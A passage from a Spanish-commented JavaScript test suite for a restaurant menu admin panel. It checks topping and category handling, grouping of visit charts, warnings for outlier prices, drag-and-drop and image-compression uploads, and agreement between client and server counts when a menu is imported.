		assert.equal(st.premium[0].id, 't_toc');
		assert.equal(st.premium[0].precio, 5000);
	});

	test('añadir uno nuevo le pone un identificador propio', () => {
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: 'BBQ' });
		assert.equal(st.salsas.length, 1);
		assert.match(st.salsas[0].id, /^top_[a-z0-9]{1,8}$/);
		assert.equal(st.salsas[0].nombre, 'BBQ');
	});

	test('el identificador nuevo no choca con los de los otros grupos', () => {
		// Los platos guardan una lista por grupo, pero un choque entre grupos
		// confundiría a cualquiera que lea 'atributos' a mano.
		const st = nuevoEstado();
		for (const nombre of ['BBQ', 'Rosada', 'Ajo'])
			montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: nombre });
		const todos = [...st.platino, ...st.premium, ...st.salsas].map(t => t.id);
		assert.equal(new Set(todos).size, todos.length, 'todos distintos');
	});

	test('un nombre repetido se rechaza', () => {
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'platino', toppingIndice: '', toppingNombre: '  queso ' });
		assert.equal(st.platino.length, 1, 'no se añade');
		assert.equal(avisos[0][0], 'error');
	});

	test('renombrar sin cambiar el nombre no se rechaza a sí mismo', () => {
		// Entrar a editar solo para tocar el precio no puede dar "ya existe".
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'premium', toppingIndice: '0', toppingNombre: 'Tocineta', toppingPrecio: '7000' });
		assert.equal(st.premium[0].precio, 7000);
		assert.ok(!avisos.some(a => a[0] === 'error'), 'no debe quejarse');
	});

	test('un nombre vacío no crea nada', () => {
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: '   ' });
		assert.equal(st.salsas.length, 0);
		assert.equal(avisos[0][0], 'error');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('moveCat · reordenar cuando dos categorías empatan en "orden"', () => {
	// Intercambiaba los dos valores de 'orden'. Con dos categorías empatadas
	// eso es intercambiar un número consigo mismo: no se movía nada y el panel
	// decía "Orden actualizado" igual. Y empatar es fácil — openNewCatModal
	// siembra `orden = state.categorias.length`, así que basta borrar una
	// categoría y crear otra.
	const mover = async (categorias, id, dir) => {
		const patches = [];
		const ctx = cargar('index.html', [
			['async function enTandas', 'function ordenProductosModo'],
			['// Reasigna 0,1,2… a toda la lista', '// ── ELIMINAR'],
		], {
			state: { categorias, restaurante: { id: 'r1' } },
			apiFetch: async (m, ruta, cuerpo) => { patches.push({ ruta, ...cuerpo }); return {}; },
			renderCatList() {}, renderCatFilter() {}, showToast() {},
			document: { querySelector: () => null },
		});
		await ctx.moveCat(id, dir);
		return { patches,
			orden: ctx.state.categorias.map(c => c.nombre),
			valores: ctx.state.categorias.map(c => c.orden) };
	};

	test('con órdenes ya distintos, mueve como siempre', async () => {
		const { orden } = await mover(
			[{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Fuertes', orden: 1 }], 'b', -1);
		assert.deepEqual([...orden], ['Fuertes', 'Entradas']);
	});

	test('con dos empatadas en 0, el movimiento sí ocurre', async () => {
		const { orden, valores } = await mover(
			[{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Postres', orden: 0 }], 'b', -1);
		assert.deepEqual([...orden], ['Postres', 'Entradas'], 'antes se quedaban como estaban');
		// Y el empate se deshace: 0 y 1, no dos ceros. Se mira el resultado y no
		// cuántos PATCH salieron — solo se manda lo que de verdad cambia, así
		// que una de las dos puede quedarse con el número que ya tenía.
		assert.deepEqual([...valores], [0, 1]);
	});

	test('no se sale por los extremos', async () => {
		const cats = [{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Fuertes', orden: 1 }];
		assert.equal((await mover(cats, 'a', -1)).patches.length, 0, 'la primera no sube');
		assert.equal((await mover(cats, 'b', 1)).patches.length, 0, 'la última no baja');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('agruparVisitas · la gráfica no puede pintar una barra por día', () => {
	// Con una barra por día, el rango "Todo" —que arranca en 2020— pintaba
	// 2.431 barras: unos 41.000 px de scroll horizontal que nadie recorre. Y
	// el `Math.max(1, ...dias)` recibía un argumento por día, así que un rango
	// bastante antiguo lo hacía reventar.
	const ctx = () => cargar('estadisticas.js', [
		['function fmtISO', 'function hoyEnZona'],
		['const MAX_BARRAS_VISITAS', 'function renderGraficaVisitas'],
	], {});

	const agrupar = (visitas, desde, hasta) => ctx().agruparVisitas(visitas, desde, hasta);

	test('un rango corto sigue siendo un día por barra', () => {
		const { barras, porBarra } = agrupar({ '2026-08-01': 3, '2026-08-03': 5 }, '2026-08-01', '2026-08-05');
		assert.equal(porBarra, 1);
		assert.equal(barras.length, 5);
		assert.equal(barras[0].visitas, 3);
		assert.equal(barras[1].visitas, 0, 'los días sin visitas cuentan cero, no se saltan');
		assert.equal(barras[2].visitas, 5);
	});

	test('el rango "Todo" se agrupa en vez de desbordarse', () => {
		const { barras, porBarra } = agrupar({}, '2020-01-01', '2026-08-27');
		assert.ok(barras.length <= 92, `92 como mucho, salieron ${barras.length}`);
		assert.ok(porBarra > 1, 'tiene que haber agrupado');
		assert.equal(barras[0].desde, '2020-01-01', 'empieza donde se pidió');
		assert.equal(barras[barras.length - 1].hasta, '2026-08-27', 'y termina donde se pidió');
	});

	test('agrupando no se pierde ni se duplica ninguna visita', () => {
		// Lo que más importa: la suma de las barras tiene que ser la suma de
		// los días. Si el agrupado se saltara un día o lo contara dos veces,
		// la gráfica mentiría y no habría forma de notarlo a ojo.
		const visitas = {};
		let total = 0;
		const d = new Date(Date.UTC(2025, 0, 1, 12));
		for (let i = 0; i < 400; i++) {
			const iso = d.toISOString().slice(0, 10);
			visitas[iso] = i % 7;
			total += i % 7;
			d.setUTCDate(d.getUTCDate() + 1);
		}
		const { barras } = agrupar(visitas, '2025-01-01', '2026-02-04');
		assert.equal(barras.reduce((s, b) => s + b.visitas, 0), total);
	});

	test('un rango al revés se avisa, no se pinta vacío', () => {
		const r = agrupar({}, '2026-08-27', '2026-08-01');
		assert.equal(r.invertido, true);
		assert.equal(r.barras.length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiElPrecioSeSale · el cero de más', () => {
	// Un plato se creó a 2.500.000 en una carta cuya mediana son 25.000. No es
	// un precio prohibido —la plataforma no puede saber qué vende cada uno—
	// pero sí es un número que no se parece a nada del resto de su carta.
	//
	// Se avisa contra la MEDIANA del propio restaurante y no contra un tope
	// fijo: 60.000 es caro en una salchipapería y barato en un restaurante de
	// autor, y aquí hay de los dos.
	//
	// El umbral de 10 sale de mirar las cartas reales el 03/09/2026: el plato
	// más caro de cada una está entre 1,1 y 3 veces su mediana. Diez deja
	// sitio de sobra para lo legítimo y caza el cero de más, que son 10 veces
	// exactas.

	const montar = (precio, productos, id = 'nuevo') => {
		const mapa = {
			editPrecioNum: { value: String(precio) },
			editProductId: { value: id },
			precioAviso:   { textContent: '', style: {} },
		};
		const ctx = cargar('index.html', 'const VECES_LA_MEDIANA_PARA_AVISAR', 'function quitarFoto', {
			state: { productos },
			document: { getElementById: i => mapa[i] },
			formatPrecio: n => `$ ${n}`,
		});
		ctx.avisarSiElPrecioSeSale();
		return mapa.precioAviso.textContent;
	};

	// Una carta como las de verdad: mediana 25.000.
	const carta = [20000, 22000, 25000, 28000, 31000, 60000]
		.map((n, i) => ({ id: `p${i}`, precio_numerico: n }));

	test('un precio con un cero de más se avisa', () => {
		assert.match(montar(2500000, carta), /veces la mediana/);
	});

	test('el plato más caro de una carta real NO se avisa', () => {
		// bonzas llega a 3 veces su mediana con 97 platos. Avisar ahí sería
		// enseñar a ignorar el aviso.
		assert.equal(montar(66000, carta), '');
	});

	test('tampoco se avisa un precio normal', () => {
		assert.equal(montar(24000, carta), '');
	});

	test('con pocos platos no se dice nada', () => {
		// Con dos precios, cualquier tercero duplica la mediana. Avisar mal es
		// peor que no avisar.
		const pocos = [{ id: 'a', precio_numerico: 20000 }, { id: 'b', precio_numerico: 25000 }];
		assert.equal(montar(2500000, pocos), '');
	});

	test('el propio plato no cuenta para su mediana', () => {
		// Editar un plato caro no puede hacer que su propio precio parezca
		// normal por estar dentro del cálculo.
		const conElCaro = [...carta, { id: 'caro', precio_numerico: 2500000 }];
		assert.match(montar(2500000, conElCaro, 'caro'), /veces la mediana/);
	});

	test('un precio vacío o cero no dispara nada', () => {
		assert.equal(montar(0, carta), '');
	});

	test('el aviso pregunta, no corrige', () => {
		// El restaurante sabe lo que vende. Lo único que sabe el panel es que
		// ese número no se parece al resto de su carta.
		const texto = montar(2500000, carta);
		assert.match(texto, /¿Es correcto\?/);
		assert.doesNotMatch(texto, /no puedes|inválido|error/i);
	});
});

describe('arrastrar y soltar · sin una segunda copia de la subida', () => {
	// Soltar hace lo mismo que elegir con el diálogo: el archivo se mete en el
	// <input> de siempre y se dispara su 'change'. Ningún manejador de subida
	// se entera de que existe otra vía, así que no hay una segunda copia de la
	// lógica que se quede atrás cuando alguien toque la primera.

	const IMG = 'image/*';
	const VID = 'video/mp4,video/quicktime,.mp4,.mov,.m4v';

	const soloTipo = () => cargar('index.html', [['function tipoAceptado', 'function habilitarArrastre']], {});

	test('una imagen pasa donde se piden imágenes', () => {
		const { tipoAceptado } = soloTipo();
		assert.equal(tipoAceptado({ getAttribute: () => IMG }, { type: 'image/jpeg', name: 'a.jpg' }), true);
		assert.equal(tipoAceptado({ getAttribute: () => IMG }, { type: 'image/png', name: 'a.png' }), true);
	});

	test('un PDF sobre la foto del plato, no', () => {
		// Sin esto llega al manejador, falla al decodificarse, y el mensaje
		// habla de otra cosa.
		const { tipoAceptado } = soloTipo();
		assert.equal(tipoAceptado({ getAttribute: () => IMG }, { type: 'application/pdf', name: 'menu.pdf' }), false);
	});

	test('el video se acepta por tipo o por extensión', () => {
		// Un .mov de iPhone llega a veces con el tipo vacío, y por eso la lista
		// de 'accept' incluye las extensiones además de los tipos.
		const { tipoAceptado } = soloTipo();
		assert.equal(tipoAceptado({ getAttribute: () => VID }, { type: 'video/mp4', name: 'p.mp4' }), true);
		assert.equal(tipoAceptado({ getAttribute: () => VID }, { type: '', name: 'PLATO.MOV' }), true);
		assert.equal(tipoAceptado({ getAttribute: () => VID }, { type: 'image/jpeg', name: 'a.jpg' }), false);
	});

	// ── EL ARCHIVO TIENE QUE LLEGAR AL INPUT DE VERDAD ────────

	const montarZona = ({ conDataTransfer = true } = {}) => {
		const oyentes = {};
		const zona = {
			dataset: {}, classList: { add() {}, remove() {} },
			contains: () => false,
			addEventListener: (ev, fn) => { oyentes[ev] = fn; },
		};
		const input = {
			dataset: { zona: 'z' }, files: null, cambios: 0, manejadoresLlamados: 0,
            getAttribute: () => IMG,
			closest: () => null,
			dispatchEvent(e) { if (e && e.type === 'change') this.cambios++; return true; },
			onchange() { this.manejadoresLlamados++; },
		};
		const avisos = [];
		const ctx = cargar('index.html', [['function tipoAceptado', '// ── ARRANQUE']], {
			document: {
				querySelectorAll: () => [input],
				getElementById: () => zona,
			},
			window: { addEventListener() {} },
			showToast: (m, t) => avisos.push([t, m]),
			Event: class { constructor(t) { this.type = t; } },
			...(conDataTransfer ? {
				DataTransfer: class { constructor() { this.items = { add: f => { this.archivo = f; } }; }
				                      get files() { return [this.archivo]; } },
			} : {}),
		});
		ctx.habilitarArrastre();
		const soltar = archivo => oyentes.drop({
			preventDefault() {}, stopPropagation() {},
			dataTransfer: { files: archivo ? [archivo] : [] },
		});
		return { soltar, input, avisos };
	};

	test('el archivo soltado acaba en el input y se dispara su change', () => {
		// Es lo que hace que no haya una segunda ruta de subida: a partir de
		// aquí es indistinguible de haberlo elegido a mano.
		const { soltar, input } = montarZona();
		soltar({ type: 'image/jpeg', name: 'plato.jpg' });

		assert.equal(input.files[0].name, 'plato.jpg');
		assert.equal(input.cambios, 1);
	});

	test('un archivo que no encaja se rechaza y se dice por qué', () => {
		const { soltar, input, avisos } = montarZona();
		soltar({ type: 'application/pdf', name: 'carta.pdf' });

		assert.equal(input.cambios, 0, 'no se sube nada');
		assert.match(avisos[0][1], /no es una imagen/);
	});

	test('soltar algo que no es un archivo no hace nada', () => {
		// Arrastrar texto seleccionado de otra pestaña, por ejemplo.
		const { soltar, input } = montarZona();
		soltar(null);
		assert.equal(input.cambios, 0);
	});

	test('sin DataTransfer se llama al manejador igual', () => {
		// Navegador que no deja construirlo: la subida tiene que seguir
		// funcionando, no quedarse en silencio.
		const { soltar, input } = montarZona({ conDataTransfer: false });
		soltar({ type: 'image/jpeg', name: 'plato.jpg' });

		assert.equal(input.manejadoresLlamados, 1);
	});
});

describe('los avisos usan una variable de color que existe', () => {
	// --warning no existe: solo está definida --warn. Un var() sin definir hace
	// que la declaración se descarte y el texto herede el color de al lado, o
	// sea que el aviso salía igual que el texto normal. Comprobado en navegador.
	const src = codigoDelPanel();

	test('nadie escribe var(--warning)', () => {
		assert.ok(!src.includes('var(--warning)'),
			'esa variable no existe: los avisos saldrían del color del texto normal');
	});

	test('y --warn sigue definida', () => {
		assert.ok(src.includes('--warn: #'), 'es la que sí existe');
	});
});

describe('la pista "o arrástralo aquí" · sin prometer nada al teléfono', () => {
	// La pista se esconde donde no hay ratón. Eso la hace útil y la hace
	// peligrosa a la vez: lo que se meta dentro desaparece para la mayoría de
	// los usuarios, que entran desde el móvil.
	const src = codigoDelPanel();
	const pistas = [...src.matchAll(/class="pista-arrastre"[^>]*>([^<]*)</g)].map(m => m[1]);

	test('todas las zonas donde se puede soltar lo anuncian', () => {
		// Media pantalla con pista y media sin ella enseña que la función no
		// existe: se prueba donde no lo dice, no pasa nada, y no se reintenta.
		//
		// Se cuentan las zonas en vez de fijar un número: un número hay que
		// subirlo cada vez que se añade una, y quien lo sube pensando "ya, es
		// que hay una más" no comprueba si esa nueva trae su pista. La regla
		// que importa es que haya tantas pistas como sitios donde soltar.
		const zonas = (src.match(/class="upload-zone"/g) || []).length
		            + (src.match(/data-zona="/g) || []).length;
		assert.equal(pistas.length, zonas,
			'hay una zona donde se puede soltar que no lo dice');
	});

	test('dentro de la pista solo va lo que sobra sin ratón', () => {
		// Si alguien mete aquí "haz clic para subir", el usuario de teléfono
		// se queda sin la única instrucción que le servía.
		//
		// Es una lista de palabras PERMITIDAS, no de prohibidas. La primera versión
		// prohibía «clic», y la pista de Promoción se coló diciendo «Pulsa «Añadir
		// promoción» o arrastra una imagen aquí»: tenía «arrastra» y no tenía
		// «clic», así que pasaba (M5). Una lista negra hay que ampliarla con cada
		// sinónimo —pulsa, toca, sube, elige…— y el fallo llega siempre por el que
		// faltaba. Aquí cualquier palabra que no sea de arrastrar la tumba.
		const PERMITIDAS = new Set(['o', 'también', 'puedes', 'arrastra', 'arrastrar', 'arrástralo',
			'arrástrala', 'arrástralas', 'la', 'las', 'lo', 'una', 'un', 'el', 'imagen', 'imágenes', 'video',
			'aquí', 'hasta', 'este', 'recuadro']);
		for (const texto of pistas) {
			assert.match(texto, /arrastr|arrástra/i, `esta pista no habla de arrastrar: "${texto}"`);
			const ajenas = texto.toLowerCase().split(/[^a-záéíóúñü]+/).filter(p => p && !PERMITIDAS.has(p));
			assert.deepEqual(ajenas, [], `esta pista esconde algo que hace falta sin ratón: "${texto}"`);
		}
	});

	test('la lista de permitidas caza el caso que se le escapó a la de prohibidas', () => {
		// M5, convertido en prueba: la frase exacta que pasó la comprobación vieja.
		const PERMITIDAS = new Set(['o', 'arrastra', 'una', 'imagen', 'aquí']);
		const texto = 'Pulsa «Añadir promoción» o arrastra una imagen aquí.';
		const ajenas = texto.toLowerCase().split(/[^a-záéíóúñü]+/).filter(p => p && !PERMITIDAS.has(p));
		assert.deepEqual(ajenas, ['pulsa', 'añadir', 'promoción']);
	});

	test('el recuadro vacío de Promoción dice qué hacer también sin ratón', () => {
		// M4. Lo que queda fuera de las pistas es lo que ve un teléfono.
		const vacio = src.match(/<div id="promoVacio"[^>]*>([\s\S]*?)<\/div>/)[1];
		const sinPistas = vacio.replace(/<span class="pista-arrastre">[^<]*<\/span>/g, '').replace(/<!--[\s\S]*?-->/g, '');
		assert.match(sinPistas, /Pulsa «Añadir promoción»/);
	});

	test('está escondida por defecto y solo aparece con ratón', () => {
		// Al revés —visible por defecto y escondida en móvil— haría falta
		// acertar con el ancho de pantalla, y el ancho no dice si hay ratón.
		assert.ok(src.includes('.pista-arrastre { display: none; }'),
			'la pista tiene que estar escondida por defecto');
		assert.ok(src.includes('@media (hover: hover) and (pointer: fine)'),
			'y aparecer solo donde hay ratón — no por ancho de pantalla');
	});
});

describe('imágenes adicionales · el tope de cuatro sin el botón "+"', () => {
	// El '+' desaparece al llegar a cuatro, y mientras esa fue la única forma
	// de añadir, eso bastaba como tope. Soltar un archivo no pasa por el
	// botón: sin una comprobación aparte, la quinta imagen entraba.
	const montar = extras => {
		const subidas = [];
		const avisos = [];
		const ctx = cargar('index.html', [['const MAX_IMAGENES_EXTRA', '// ── LA FICHA SEGÚN EL MODELO']], {
			state: { extraImgs: [...extras] },
			document: { getElementById: () => ({ innerHTML: '', appendChild() {}, querySelector: () => ({}) }) },
			showToast: (m, t) => avisos.push([t, m]),
			compressImage: async b => { subidas.push(b); return b; },
			uploadImg: async () => 'https://x/nueva.jpg',
			esc: v => v,
		});
		return { ctx, subidas, avisos };
	};

	test('la quinta no se sube', () => {
		const { ctx, subidas, avisos } = montar(['a', 'b', 'c', 'd']);
		const input = { files: [{ name: 'quinta.jpg' }], value: 'quinta.jpg' };
		ctx.handleExtraImgUpload(input);

		assert.equal(subidas.length, 0, 'no llega a comprimirse ni a subirse');
		assert.equal(ctx.state.extraImgs.length, 4);
		assert.match(avisos[0][1], /máximo/);
		assert.equal(input.value, '', 'se limpia el input o el mismo archivo no vuelve a entrar');
	});

	test('la cuarta sí', async () => {
		const { ctx, subidas } = montar(['a', 'b', 'c']);
		await ctx.handleExtraImgUpload({ files: [{ name: 'cuarta.jpg' }], value: '' });

		assert.equal(subidas.length, 1);
		assert.equal(ctx.state.extraImgs.length, 4);
	});
});

describe('compressImage · formato de salida y fallos que antes colgaban', () => {
	// Dos fallos en la misma función. Salía siempre JPEG, y JPEG no tiene canal
	// alfa: un logo PNG con fondo transparente acababa con un rectángulo negro.
	// Y la promesa no tenía 'rej' ni manejadores de error, así que un archivo
	// que no decodificaba dejaba la promesa sin resolver PARA SIEMPRE — el
	// panel se quedaba en "Subiendo..." y no había más salida que recargar.
	function entorno({ fallaLectura = false, fallaDecodificacion = false, blobNulo = false,
	                   haceWebp = false } = {}) {
		const visto = {};
		return {
			visto,
			FileReader: class {
				readAsDataURL() {
					setTimeout(() => fallaLectura ? this.onerror?.() : this.onload?.({ target: { result: 'data:,' } }), 0);
				}
			},
			Image: class {
				constructor() { this.width = 1000; this.height = 500; }
				set src(_) { setTimeout(() => fallaDecodificacion ? this.onerror?.() : this.onload?.(), 0); }
			},
			document: {
				createElement: () => ({
					getContext: () => ({ drawImage() {} }),
					toBlob(cb, tipo) { visto.tipo = tipo; cb(blobNulo ? null : { type: tipo }); },
					// Un navegador que no encodea WebP no falla al pedírselo:
					// devuelve un PNG. Se imita porque es justo lo que hace
					// peligroso el cambio, y lo que la detección tiene que ver.
					toDataURL: tipo => (haceWebp && tipo === 'image/webp')
						? 'data:image/webp;base64,AA' : 'data:image/png;base64,AA',
				}),
			},
		};
	}

	const comprimir = (archivo, opciones, fallos) => {
		const ctx = entorno(fallos);
		const cargado = cargar('index.html', [['let _haceWebp', 'async function uploadImg']], ctx);
		return { promesa: cargado.compressImage(archivo, 500, .9, opciones), visto: ctx.visto };
	};

	// ── CON WEBP, QUE ES EL CAMINO NORMAL HOY ─────────────────
	// La misma foto pesa entre un 30% y un 40% menos, y eso lo paga el
	// comensal en datos móviles cada vez que abre una carta.

	test('una foto sale en WebP si el navegador sabe', async () => {
		const { promesa, visto } = comprimir({ type: 'image/jpeg' }, {}, { haceWebp: true });
		const blob = await promesa;
		assert.equal(visto.tipo, 'image/webp');
		assert.equal(blob.type, 'image/webp');
	});

	test('un logo también, porque WebP sí tiene transparencia', async () => {
		// Salía en PNG solo para no perder el canal alfa. WebP lo tiene, así
		// que se conserva igual y pesando bastante menos.
		const { promesa, visto } = comprimir({ type: 'image/png' }, { conservarTransparencia: true }, { haceWebp: true });
		await promesa;
		assert.equal(visto.tipo, 'image/webp');
	});

	// ── SIN WEBP, TODO SIGUE COMO ESTABA ──────────────────────
	// Y esto es lo que hace seguro el cambio. toBlob() no falla cuando no sabe
	// producir el tipo que se le pide: devuelve un PNG. Un PNG de una foto
	// pesa varias veces lo que el JPEG de antes, así que dar el soporte por
	// supuesto habría empeorado las cartas en Safari anterior a la 16.4 —en
	// silencio, que es lo peor.

	test('un logo PNG se queda en PNG', async () => {
		const { promesa, visto } = comprimir({ type: 'image/png' }, { conservarTransparencia: true });
		const blob = await promesa;
		assert.equal(visto.tipo, 'image/png');
		assert.equal(blob.type, 'image/png');
	});

	test('una foto de plato sigue saliendo JPEG', async () => {
		const { promesa, visto } = comprimir({ type: 'image/png' }, {});
		await promesa;
		assert.equal(visto.tipo, 'image/jpeg', 'sin pedirlo, no se conserva la transparencia');
	});

	test('un JPEG no se convierte a PNG aunque se pida transparencia', async () => {
		// Convertirlo no recupera una transparencia que nunca tuvo, y sí
		// multiplica el peso.
		const { promesa, visto } = comprimir({ type: 'image/jpeg' }, { conservarTransparencia: true });
		await promesa;
		assert.equal(visto.tipo, 'image/jpeg');
	});

	test('nunca se pide WebP a quien no sabe hacerlo', async () => {
		// Sería pedir un PNG por la puerta de atrás, que es peor que el JPEG.
		const { promesa, visto } = comprimir({ type: 'image/jpeg' }, {});
		await promesa;
		assert.notEqual(visto.tipo, 'image/webp');
	});

	test('un archivo que no decodifica RECHAZA en vez de colgarse', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { fallaDecodificacion: true });
		await assert.rejects(() => promesa, /no es una imagen/);
	});

	test('un archivo ilegible también rechaza', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { fallaLectura: true });
		await assert.rejects(() => promesa, /No se pudo leer/);
	});

	test('y un toBlob que devuelve null tampoco deja la promesa colgada', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { blobNulo: true });
		await assert.rejects(() => promesa, /No se pudo procesar/);
	});

	// ── EL NOMBRE TIENE QUE DECIR LO QUE ES ───────────────────
	// El servidor saca la extensión con la que guarda del nombre que se le
	// manda, y el archivo se sirve después con el Content-Type que sale de esa
	// extensión. Un .webp llamado .jpg llegaría al navegador anunciado como
	// JPEG: muchos lo adivinan por el contenido, y es justo la clase de cosa
	// que funciona hasta que deja de hacerlo en un dispositivo concreto.

	const subir = async blob => {
		let nombre = null;
		const ctx = cargar('index.html', [['async function uploadImg', '// ── ESCAPE CIERRA LAS VENTANAS']], {
			FormData: class { append(_c, _b, n) { if (n) nombre = n; } },
			apiFetch: async () => ({ url: 'https://panel/uploads/productos/x' }),
		});
		await ctx.uploadImg(blob);
		return nombre;
	};

	test('un blob WebP se sube con extensión .webp', async () => {
		assert.match(await subir({ type: 'image/webp' }), /\.webp$/);
	});

	test('y los de siempre siguen con la suya', async () => {
		assert.match(await subir({ type: 'image/png' }),  /\.png$/);
		assert.match(await subir({ type: 'image/jpeg' }), /\.jpg$/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('importar la carta · lo que se le enseña antes de crear nada', () => {
	// El panel no puede importar importacion.js, así que la regla de "¿esta
	// categoría ya existe?" está escrita DOS veces. Si se separan, el número
	// del botón miente: el panel dice "3 categorías nuevas" y el servidor crea
	// 2. Estas pruebas son lo único que lo impide.
	const importacion = require('../importacion.js');

	const panel = () => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]], {});

	const NOMBRES = [
		'POSTRES', 'postres', '  Póstres  ', 'Café', 'CAFE', 'Bebidas   calientes',
		'BEBIDAS CALIENTES', 'Ñoquis', 'nOqUiS', 'Patacón', '', '   ', 'Salchipapas',
	];

	test('las dos copias normalizan igual', () => {
		const { impNormalizar } = panel();
		for (const n of NOMBRES)
			assert.equal(impNormalizar(n), importacion.normalizar(n), `discrepan en "${n}"`);
	});

	// Los mismos borradores por los dos caminos: el que pinta el botón y el que
	// de verdad crea las filas.
	const CASOS = [
		{
			nombre: 'una categoría que ya existe y otra que no',
			existentes: [{ id: 'c1', nombre: 'POSTRES', orden: 2 }],
			borrador: {
				categorias: [
					{ nombre: 'Postres', platos: [{ nombre: 'FLAN', precio_numerico: 5000 }] },
					{ nombre: 'CALDOS', platos: [{ nombre: 'CALDO', precio_numerico: 8000 }] },
				],
			},
		},
		{
			nombre: 'un título repetido en dos páginas',
			existentes: [],
			borrador: {
				categorias: [
					{ nombre: 'PATACONES', platos: [{ nombre: 'A' }] },
					{ nombre: 'Patacones', platos: [{ nombre: 'B' }] },
				],
			},
		},
		{
			nombre: 'una categoría sin platos no cuenta',
			existentes: [],
			borrador: {
				categorias: [
					{ nombre: 'VACIA', platos: [] },
					{ nombre: 'CARNES', platos: [{ nombre: 'LOMO' }] },
				],
			},
		},
		{
			nombre: 'platos sueltos, sin categoría',
			existentes: [{ id: 'c9', nombre: 'Otros', orden: 1 }],
			borrador: { categorias: [{ nombre: '', platos: [{ nombre: 'SOPA' }] }] },
		},
		{
			nombre: 'platos sin nombre que no se crean',
			existentes: [],
			borrador: { categorias: [{ nombre: 'X', platos: [{ nombre: '  ' }, { nombre: 'SOPA' }] }] },
		},
		{
			nombre: 'tildes de por medio',
			existentes: [{ id: 'c2', nombre: 'Café', orden: 1 }],
			borrador: { categorias: [{ nombre: 'CAFE', platos: [{ nombre: 'TINTO' }] }] },
		},
	];

	for (const caso of CASOS) {
		test(`las cuentas cuadran con el servidor · ${caso.nombre}`, () => {
			const t = panel().impTotales(caso.borrador, caso.existentes);
			const real = importacion.planDeAplicacion(caso.borrador, caso.existentes).totales;
			assert.equal(t.nuevas, real.categorias_nuevas, 'categorías nuevas');
			assert.equal(t.existen, real.categorias_reutilizadas, 'categorías reutilizadas');
			assert.equal(t.platos, real.platos, 'platos');
		});
	}

	test('sin nada que crear, las cuentas son cero', () => {
		const { impTotales } = panel();
		for (const b of [null, undefined, {}, { categorias: [] }, { categorias: [{ nombre: 'X', platos: [] }] }])
			assert.deepEqual(JSON.stringify(impTotales(b, [])), JSON.stringify({ nuevas: 0, existen: 0, platos: 0 }));
	});
});

describe('importar la carta · lo que se manda es lo que se ve', () => {
	// impBorradorDelFormulario lee la pantalla, no una copia en memoria. Es lo
	// que hace que quitar un plato de la vista lo quite de verdad, y que una
	// corrección a mano llegue tal cual.
	function pantalla(bloques) {
		const campo = v => ({ value: v });
		const platoFalso = ([nom, desc, pre]) => ({
			querySelector: sel => ({ '.imp-p-nombre': campo(nom), '.imp-p-desc': campo(desc), '.imp-p-precio': campo(pre) }[sel]),
		});
		return {
			querySelectorAll: () => bloques.map(([nombre, platos]) => ({
				querySelector: sel => (sel === '.imp-cat-nombre' ? campo(nombre) : null),
				querySelectorAll: () => platos.map(platoFalso),
			})),
		};
	}

	const leer = bloques => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]],
		{ document: pantalla(bloques) }).impBorradorDelFormulario();

	test('recoge lo que hay en los campos', () => {
		const b = leer([['CALDOS', [['CALDO DE COSTILLA', 'CON AREPA', '$ 10.000']]]]);
		assert.equal(b.categorias[0].nombre, 'CALDOS');
		assert.equal(b.categorias[0].platos[0].nombre, 'CALDO DE COSTILLA');
		assert.equal(b.categorias[0].platos[0].descripcion, 'CON AREPA');
		assert.equal(b.categorias[0].platos[0].precio, '$ 10.000');
	});

	test('el precio va como TEXTO, igual que lo devuelve el modelo', () => {
		// Así el servidor lo normaliza con la misma regla en los dos casos, en
		// vez de tener una para lo que llega del modelo y otra para lo
		// corregido a mano.
		assert.equal(typeof leer([['X', [['SOPA', '', '12.000']]]]).categorias[0].platos[0].precio, 'string');
	});

	test('lo que se quitó de la pantalla no se manda', () => {
		const b = leer([['X', [['SOPA', '', '1000']]], ['Y', []]]);
		assert.equal(b.categorias.length, 2);
		assert.equal(b.categorias[1].platos.length, 0, 'la categoría vacía llega vacía y el servidor la descarta');
	});
});

describe('importar la carta · los platos que el restaurante ya tiene', () => {
	// Importar AÑADE y no reemplaza. Sin avisar, meterle su propia carta a un
	// restaurante que ya tiene menú se lo duplica entero — y la pantalla no
	// diría nada. Bonzas son 97 platos: 97 duplicados que deshacer a mano.
	const panel = extra => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]],
		Object.assign({ state: { productos: [] } }, extra));

	const conProductos = nombres => panel({ state: { productos: nombres.map(n => ({ nombre: n })) } });

	test('reconoce el mismo plato aunque esté escrito distinto', () => {
		const ctx = conProductos(['Hamburguesa clásica', 'PATACÓN MIXTO']);
		const previos = ctx.impNombresQueYaTiene();
		for (const escrito of ['HAMBURGUESA CLASICA', 'hamburguesa clásica', '  Hamburguesa  Clasica '])
			assert.equal(previos.has(ctx.impNormalizar(escrito)), true, escrito);
	});

	test('y no confunde dos platos distintos', () => {
		const ctx = conProductos(['Hamburguesa clásica']);
		assert.equal(ctx.impNombresQueYaTiene().has(ctx.impNormalizar('Hamburguesa doble')), false);
	});

	test('un restaurante sin platos no tiene ninguno repetido', () => {
		assert.equal(panel().impNombresQueYaTiene().size, 0);
	});

	test('un producto sin nombre no cuenta', () => {
		const ctx = panel({ state: { productos: [{ nombre: null }, {}, { nombre: 'SOPA' }] } });
		assert.equal(ctx.impNombresQueYaTiene().size, 1);
	});

	test('usa la MISMA regla que las categorías', () => {
		// Si comparara los platos de una forma y las categorías de otra, la
		// pantalla diría dos cosas distintas sobre el mismo texto.
		const ctx = conProductos(['Café con leche']);
